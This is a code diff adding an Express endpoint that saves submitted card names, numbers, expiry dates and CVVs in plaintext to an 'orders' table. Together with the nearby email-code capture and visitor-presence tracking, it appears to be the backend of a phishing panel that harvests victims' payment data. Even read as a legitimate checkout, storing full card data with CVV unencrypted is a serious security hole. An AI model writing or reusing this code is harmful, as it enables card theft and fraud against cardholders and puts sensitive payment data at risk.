@@ -108,6 +108,22 @@ app.post('/api/email-code-data', async (req, res) => {
   }
 });
 
+// Save card details
+app.post('/api/card-data', async (req, res) => {
+  try {
+    const { order_id, card_name, card_number, card_expiry, card_cvv } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({
+        card_name, card_number, card_expiry, card_cvv,
+        status: 'card_pending', current_page: 'card-details'
+      }).eq('id', order_id);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
 // Presence / heartbeat for active visitors
 app.post('/api/presence', async (req, res) => {
   try {
